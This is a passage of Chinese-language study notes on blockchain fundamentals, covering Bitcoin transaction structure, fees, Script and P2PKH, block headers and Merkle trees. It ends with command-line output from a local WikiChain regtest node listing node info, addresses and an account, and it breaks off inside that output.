集（UTXOset）中被每一个全节点比特币客户端追踪。 新的交易从UTXO 集中消耗（花费）一个或多个输出。</p><figure><table><thead><tr><th>尺寸</th><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>8 个字节</td><td>总量</td><td>用聪表示的比特币值（10<sup>-8</sup> 比特币）</td></tr><tr><td>1–9 个字节（可变整数）</td><td>锁定脚本尺寸</td><td>用字节表示的后面的锁定脚本长度</td></tr><tr><td>变长</td><td>锁定脚本</td><td>一个定义了支付输出所需条件的脚本</td></tr></tbody></table></figure><ul><li>一定量的比特币，面值为“聪”（satoshis），是最小的比特币单位</li><li>确定花费输出所需条件的加密难题（cryptographic puzzle）。这个加密难题也被称为锁定脚本（locking script）, 见证脚本（witness script）, 或脚本公钥 （scriptPubKey）</li></ul><h4><a name='header-n707' class='md-header-anchor '></a>交易输入</h4><p>交易输入将 UTXO（通过引用）标记为将被消费，并通过解锁脚本提供所有权证明。</p><p>要构建一个交易，一个钱包从它控制的 UTXO 中选择足够的价值来执行被请求的付款。有时一个 UTXO 就足够，其他时候不止一个。对于将用于进行此付款的每个 UTXO，钱包将创建一个指向 UTXO 的输入，并使用解锁脚本解锁它。</p><figure><table><thead><tr><th>尺寸</th><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>32 个字节</td><td>交易</td><td>指向交易包含的被花费的 UTXO 的哈希指针</td></tr><tr><td>4 个字节</td><td>输出索引</td><td>被花费的 UTXO 的索引号，第一个是 0</td></tr><tr><td>1–9  个字节（可变整数）</td><td>解锁脚本尺寸</td><td>用字节表示的后面的解锁脚本长度</td></tr><tr><td>变长</td><td>解锁脚本</td><td>一个达到 UTXO 锁定脚本中的条件的脚本</td></tr><tr><td>4 个字节</td><td>序列号</td><td>目前未被使用的交易替换功能，设成 0xFFFFFFFF</td></tr></tbody></table></figure><ul><li>一个交易 ID，引用包含正在使用的 UTXO 的交易</li><li>一个输出索引（vout），用于标识来自该交易的哪个 UTXO 被引用（第一个为零）</li><li>一个 scriptSig（解锁脚本），满足放置在 UTXO 上的条件，解锁它用于支出</li><li>一个序列号</li></ul><h4><a name='header-n750' class='md-header-anchor '></a>交易费</h4><p>大多数交易包含交易费（矿工费），这是为了确保网络安全而给比特币矿工的一种补偿。费用本身也作为一个安全机制，使经济上不利于攻击者通过交易来淹没网络。</p><p>交易费作为矿工打包（挖矿）一笔交易到下一个区块中的一种激励；同时作为一种抑制因素，通过对每一笔交易收取小额费用来防止对系统的滥用。成功挖到某区块的矿工将得到该区内包含的矿工费， 并将该区块添加至区块链中。</p><p>交易费是基于交易的千字节规模来计算的，而不是比特币交易的价值。总的来说，交易费是根据比特币网络中的市场力量确定的。矿工会依据许多不同的标准对交易进行优先级排序，包括费用，他们甚至可能在某些特定情况下免费处理交易。但大多数情况下，交易费影响处理优先级，这意味着有足够费用的交易会更可能被打包进下一个挖出的区块中；反之交易费不足或者没有交易费的交易可能会被推迟，基于尽力而为的原则在几个区块之后被处理，甚至可能根本不被处理。交易费不是强制的，而且没有交易费的交易最终也可能会被处理，但是，交易费将提高处理优先级。</p><h4><a name='header-n757' class='md-header-anchor '></a>交易脚本和脚本语言</h4><blockquote><p>比特币交易验证并不基于静态模式<strong>，</strong>而是通过脚本语言的执行来实现的。这种语言允许表达几乎无限的各种条件。这也是比特币作为一种“可编程的货币”所拥有的力量。</p></blockquote><h5><a name='header-n761' class='md-header-anchor '></a>图灵非完备性</h5><p>比特币脚本语言包含许多操作码，但都故意限定为一种重要的模式——<strong>除了有条件的流控制以外，没有循环或复杂流控制能力</strong>。这样就保证了脚本语言的图灵非完备性，这意味着<strong>脚本有限的复杂性和可预见的执行次数</strong>。脚本并不是一种通用语言，这些限制<strong>确保该语言不被用于创造无限循环或其它类型的逻辑炸弹</strong>，这样的炸弹可以植入在一笔交易中，引起针对比特币网络的“拒绝服务”攻击。记住，每一笔交易都会被网络中的全节点验证，受限制的语言能防止交易验证机制被作为一个漏洞而加以利用。</p><h5><a name='header-n764' class='md-header-anchor '></a>去中心化验证</h5><p>比特币交易脚本语言是没有中心化主体的，没有任何中心主体能凌驾于脚本之上，也没有中心主体会在脚本被执行后对其进行保存。所以执行脚本所需信息都已包含在脚本中。可以预见的是，一个脚本能在任何系统上以相同的方式执行。如果您的系统验证了一个脚本，可以确信的是每一个比特币网络中的其他系统也将验证这个脚本，这意味着一个有效的交易对每个人而言都是有效的，而且每一个人都知道这一点。这种结果可预见性是比特币系统的一项至关重要的良性特征。</p><h5><a name='header-n767' class='md-header-anchor '></a>脚本构建（锁定与解锁）</h5><p>比特币的交易验证引擎依赖于两类脚本来验证比特币交易：锁定脚本和解锁脚本。</p><p>锁定脚本是一个放置在输出上面的花费条件：它指定了今后花费这笔输出必须要满足的条件。 由于锁定脚本往往含有一个公钥或比特币地址（公钥哈希值），在历史上它曾被称为脚本公钥（scriptPubKey）。</p><p>解锁脚本是一个“解决”或满足被锁定脚本在一个输出上设定的花费条件的脚本，它将允许输出被消费。解锁脚本是每一笔比特币交易输入的一部分，而且往往含有一个由用户的比特币钱包（通过用户的私钥）生成的数字签名。由于解锁脚本常常包含一个数字签名，因此它曾被称作 ScriptSig。但并非所有解锁脚本都一定会包含签名。</p><p>每一个比特币验证节点会通过同时执行锁定和解锁脚本来验证一笔交易。每个输入都包含一个解锁脚本，并引用了之前存在的 UTXO。 验证软件将复制解锁脚本，检索输入所引用的 UTXO，并从该 UTXO 复制锁定脚本。 然后依次执行解锁和锁定脚本。 如果解锁脚本满足锁定脚本条件，则输入有效。 所有输入都是独立验证的，作为交易总体验证的一部分。</p><h5><a name='header-n776' class='md-header-anchor '></a>脚本执行堆栈</h5><p>比特币的脚本语言被称为基于堆栈的语言，因为它使用一种被称为堆栈的数据结构。堆栈是一个非常简单的数据结构，可以被视为一叠卡片。栈允许两个操作：push 和pop（推送和弹出）。 Push（推送）在堆栈顶部添加一个项目。 Pop（弹出）从堆栈中删除最顶端的项。栈上的操作只能作用于栈最顶端项目。堆栈数据结构也被称为“后进先出”（ Last-In-First-Out）或 “LIFO” 队列。</p><p>脚本语言通过从左到右处理每个项目来执行脚本。数字（数据常量）被推到堆栈上。操作码（Operators）从堆栈中推送或弹出一个或多个参数，对其进行操作，并可能将结果推送到堆栈上。例如，操作码 OP_ADD 将从堆栈中弹出两个项目，添加它们，并将结果的总和推送到堆栈上。</p><p>条件操作码（Conditional operators）对一个条件进行评估，产生一个 TRUE 或 FALSE 的布尔结果（boolean result）。例如， OP_EQUAL 从堆栈中弹出两个项目，如果它们相等，则推送为 TRUE（由数字1表示），否则推送为 FALSE（由数字0表示）。比特币交易脚本通常包含条件操作码，以便它们可以产生用来表示有效交易的 TRUE 结果。</p><h5><a name='header-n783' class='md-header-anchor '></a>P2PKH（Pay-to-Public-Key-Hash）</h5><p>比特币网络处理的大多数交易花费的都是由“付款至公钥哈希”（或 P2PKH）脚本锁定的输出，这些输出都含有一个锁定脚本，将输入锁定为一个公钥哈希值，即我们常说的比特币地址。由 P2PKH 脚本锁定的输出可以通过提供一个公钥和由相应私钥创建的数字签名来解锁（使用）。</p><p>例如，我们可以再次回顾一下 Alice 向 Bob 咖啡馆支付的案例。Alice 下达了向 Bob 咖啡馆的比特币地址支付0.015 比特币的支付指令，该笔交易的输出内容为以下形式的锁定脚本：</p><pre spellcheck="false" class="md-fences mock-cm md-end-block" lang="" contenteditable="false" cid="n788" mdtype="fences">OP_DUP OP_HASH160 &lt;Cafe Public Key Hash&gt; OP_EQUALVERIFY OP_CHECKSIG
</pre><p>脚本中的 Cafe Public Key Hash 即为咖啡馆的比特币地址，但该地址不是基于 Base58Check 编码。事实上，大多数比特币地址的公钥哈希值都显示为十六进制码，而不是大家所熟知的以1开头的基于 Bsase58Check 编码的比特币地址。</p><p>上述锁定脚本相应的解锁脚本是：</p><pre spellcheck="false" class="md-fences mock-cm md-end-block" lang="" contenteditable="false" cid="n793" mdtype="fences">&lt;Cafe Signature&gt; &lt;Cafe Public Key&gt;
</pre><p>将两个脚本结合起来可以形成如下组合验证脚本：</p><pre spellcheck="false" class="md-fences mock-cm md-end-block" lang="" contenteditable="false" cid="n796" mdtype="fences">&lt;Cafe Signature&gt; &lt;Cafe Public Key&gt; OP_DUP OP_HASH160
&lt;Cafe Public Key Hash&gt; OP_EQUALVERIFY OP_CHECKSIG
</pre><h3><a name='header-n797' class='md-header-anchor '></a>比特币网络</h3><h4><a name='header-n798' class='md-header-anchor '></a>p2p 网络架构</h4><h4><a name='header-n799' class='md-header-anchor '></a>节点类型及分工</h4><ul><li>钱包</li><li>矿工</li><li>完整区块链</li><li>网络路由节点</li></ul><h3><a name='header-n813' class='md-header-anchor '></a>区块链</h3><h4><a name='header-n814' class='md-header-anchor '></a>区块结构</h4><p>区块是一种被包含在公开账簿（区块链）里的聚合了交易信息的容器数据结构。它由一个包含元数据的区块头和紧跟其后的构成区块主体的一长串交易组成。区块头是 80 字节，而平均每个交易至少是 250 字节，而且平均每个区块至少包含超过 500 个交易。因此，一个包含所有交易的完整区块比区块头的 1000 倍还要大。</p><figure><table><thead><tr><th>大小</th><th>字段</th><th>描述</th></tr></thead><tbody><tr><td>4 字节</td><td>区块大小</td><td>用字节表示的该字段之后的区块大小</td></tr><tr><td>80 字节</td><td>区块头</td><td>组成区块头的几个字段</td></tr><tr><td>1-9 （可变整数）</td><td>交易计数器</td><td>交易的数量</td></tr><tr><td>可变的</td><td>交易</td><td>记录在区块里的交易信息</td></tr></tbody></table></figure><h4><a name='header-n838' class='md-header-anchor '></a>区块头</h4><p>区块头由三组区块元数据组成。首先是一组引用父区块哈希值的数据，这组元数据用于将该区块与区块链中前一区块相连接。第二组元数据，即难度、时间戳和 nonce，与挖矿竞争相关。第三组元数据是 merkle 树根（一种用来有效地总结区块中所有交易的数据结构）。</p><figure><table><thead><tr><th>大小</th><th>字段</th><th>描述</th></tr></thead><tbody><tr><td>4 字节</td><td>版本</td><td>版本号，用于跟踪软件/协议的更新</td></tr><tr><td>32 字节</td><td>父区块哈希值</td><td>引用区块链中父区块的哈希值</td></tr><tr><td>32 字节</td><td>Merkle 根</td><td>该区块中交易的 merkle 树根的哈希值</td></tr><tr><td>4 字节</td><td>时间戳</td><td>该区块产生的近似时间（精确到秒的 Unix 时间戳）</td></tr><tr><td>4 字节</td><td>难度目标</td><td>该区块工作量证明算法的难度目标</td></tr><tr><td>4 字节</td><td>Nonce</td><td>用于工作量证明算法的计数器</td></tr></tbody></table></figure><h4><a name='header-n870' class='md-header-anchor '></a>区块标识符</h4><p>区块标识符：包括区块头哈希值和区块高度。</p><p>区块主标识符是它的加密哈希值，一个通过 SHA256 算法对区块头进行二次哈希计算而得到的数字指纹。产生的 32 字节哈希值被称为区块哈希值，但是更准确的名称是：区块头哈希值，因为只有区块头被用于计算。例如：000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f 是第一个比特币区块的区块哈希值。区块哈希值可以唯一、明确地标识一个区块，并且任何节点通过简单地对区块头进行哈希计算都可以独立地获取该区块哈希值。</p><p>注意：<strong>区块哈希值实际上并不包含在区块的数据结构里</strong>，不管是该区块在网络上传输时，抑或是它作为区块链的一部分被存储在某节点的永久性存储设备上时。相反，区块哈希值是当该区块从网络被接收时由每个节点计算出来的。<strong>区块的哈希值可能会作为区块元数据的一部分被存储在一个独立的数据库表中，以便于索引和更快地从磁盘检索区块。</strong></p><p>第二种识别区块的方式是通过该区块在区块链中的位置，即“区块高度（block height）”。第一个区块，其区块高度为 0，和之前哈希值 000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f 所引用的区块为同一个区块。因此，区块可以通过两种方式被识别：区块哈希值或者区块高度。每一个随后被存储在第一个区块之上的区块在区块链中都比前一区块“高”出一个位置，就像箱子一个接一个堆叠在其他箱子之上。</p><p>注意：<strong>区块高度也不是区块数据结构的一部分</strong>，它并不被存储在区块里。当节点接收来自比特币网络的区块时，会动态地识别该区块在区块链里的位置（区块高度）。<strong>区块高度也可作为元数据存储在一个索引数据库表中以便快速检索。</strong></p><blockquote><p>一个区块的区块哈希值总是能唯一地识别出一个特定区块。一个区块也总是有特定的区块高度。但是，一个特定的区块高度并不一定总是能唯一地识别出一个特定区块。更确切地说，两个或者更多数量的区块也许会为了区块链中的一个位置而竞争。</p></blockquote><h4><a name='header-n884' class='md-header-anchor '></a>创世区块</h4><p>区块链里的第一个区块创建于 2009 年，被称为创世区块。它是区块链里面所有区块的共同祖先，这意味着你从任一区块，循链向后回溯，最终都将到达创世区块。</p><p>因为创世区块被编入到比特币客户端软件里，所以每一个节点都始于至少包含一个区块的区块链，这能确保创世区块不会被改变。每一个节点都“知道”创世区块的哈希值、结构、被创建的时间和里面的一个交易。因此，每个节点都把该区块作为区块链的首区块，从而构建了一个安全的、可信的区块链的根。</p><h4><a name='header-n889' class='md-header-anchor '></a>区块的连接</h4><blockquote><p>区块通过引用父区块的区块头哈希值的方式，以链条的形式进行相连</p></blockquote><p>比特币的完整节点保存了区块链从创世区块起的一个本地副本。随着新的区块的产生，该区块链的本地副本会不断地更新用于扩展这个链条。当一个节点从网络接收传入的区块时，它会验证这些区块，然后链接到现有的区块链上。为建立一个连接，一个节点将检查传入的区块头并寻找该区块的“父区块哈希值”。</p><h4><a name='header-n895' class='md-header-anchor '></a>Merkle 树</h4><p>Merkle 树是一种哈希二叉树，它是一种用作快速归纳和校验大规模数据完整性的数据结构。这种二叉树包含加密哈希值。</p><p>在比特币网络中，Merkle 树被用来归纳一个区块中的所有交易，同时生成整个交易集合的数字指纹，且提供了一种校验区块是否存在某交易的高效途径。生成一棵完整的 Merkle 树需要递归地对哈希节点对进行哈希，并将新生成的哈希节点插入到 Merkle 树中，直到只剩一个哈希节点，该节点就是 Merkle 树的根。在比特币的 Merkle树中两次使用到了 SHA256 算法，因此其加密哈希算法也被称为 double-SHA256。</p><p>当 N 个数据元素经过加密后插入 Merkle 树时，你至多计算 2*log2(N) 次就能检查出任意某数据元素是否在该树中，这使得该数据结构非常高效。</p><h3><a name='header-n902' class='md-header-anchor '></a>挖矿与共识</h3><h2><a name='header-n903' class='md-header-anchor '></a>维基链（智能合约）</h2><h3><a name='header-n904' class='md-header-anchor '></a>获取节点信息</h3><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getinfo</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"version"</span> : <span class="cm-number">1000009</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"fullversion"</span> : <span class="cm-string">"v1.0.0.9-unk-release-linux (Jun 25 2018, 14:00:42)"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"protocolversion"</span> : <span class="cm-number">10001</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"walletversion"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">207900000</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"blocks"</span> : <span class="cm-number">147</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"timeoffset"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"connections"</span> : <span class="cm-number">20</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"proxy"</span> : <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"nettype"</span> : <span class="cm-string">"REGTEST_NET"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"chainwork"</span> : <span class="cm-string">"0000000000000000000000000000000000000000000000000000000000000093"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"tipblocktime"</span> : <span class="cm-number">1529917110</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"paytxfee"</span> : <span class="cm-number">0</span>.00010000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"relayfee"</span> : <span class="cm-number">0</span>.00001000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"fuelrate"</span> : <span class="cm-number">1</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"fuel"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"data directory"</span> : <span class="cm-string">"/root/wikichain/tmp/node1/./regtest"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"syncheight"</span> : <span class="cm-number">147</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"tip block hash"</span> : <span class="cm-string">"17142e0ea57dfc941b2af5cf1c8b971a4444b95b13bc148b01b6fe8e5fc29eeb"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"errors"</span> : <span class="cm-string">""</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 537px;"></div><div class="CodeMirror-gutters" style="display: none; height: 537px;"></div></div></div></pre><h4><a name='header-n906' class='md-header-anchor '></a>获取地址列表</h4><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. listaddr</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"addr"</span> : <span class="cm-string">"wLKf2NqwtHk3BfzK5wMDfbKYN1SC3weyR4"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">207900000</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"haveminerkey"</span> : <span class="cm-atom">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"regid"</span> : <span class="cm-string">"0-1"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"addr"</span> : <span class="cm-string">"wNDue1jHcgRSioSDL4o1AzXz3D72gCMkP6"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">0</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"haveminerkey"</span> : <span class="cm-atom">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"regid"</span> : <span class="cm-string">"0-2"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"addr"</span> : <span class="cm-string">"whi2S53LfKcn999VWWYULJJ2kVUWFTcPBW"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"balance"</span> : <span class="cm-number">0</span>.00000000,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"haveminerkey"</span> : <span class="cm-atom">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"regid"</span> : <span class="cm-string">" "</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">]</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 491px;"></div><div class="CodeMirror-gutters" style="display: none; height: 491px;"></div></div></div></pre><h4><a name='header-n908' class='md-header-anchor '></a>获取账户信息</h4><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@ubuntu:~/wikichain/tmp/node1<span class="cm-comment"># ./node1 -datadir=. getaccountinfo wLKf2NqwtHk3BfzK5wMDfbKYN1SC3weyR4</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"Address"</span> : <span class="cm-string">"wLKf2NqwtHk3BfzK5wMDfbKYN1SC3weyR4"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"KeyID"</span> : <span class="cm-string">"079b9296a00a2b655787fa90e66ec3cde4bf1c8c"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"RegID"</span> : <span class="cm-string">"0-1"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"PublicKey"</span> : <span class="cm-string">"036c5397f3227a1e209952829d249b7ad0f615e43b763ac15e3a6f52627a10df21"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"MinerPKey"</span> : <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"Balance"</span> : <span class="cm-number">20790000000000000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"Votes"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"UpdateHeight"</span> : <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"voteFundList"</span> : [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"address"</span> : <span class="cm-string">"wNDue1jHcgRSioSDL4o1AzXz3D72gCMkP6"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">"value"</span> : <span class="cm-number">210000000000000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  {</span></pre><pre class=" 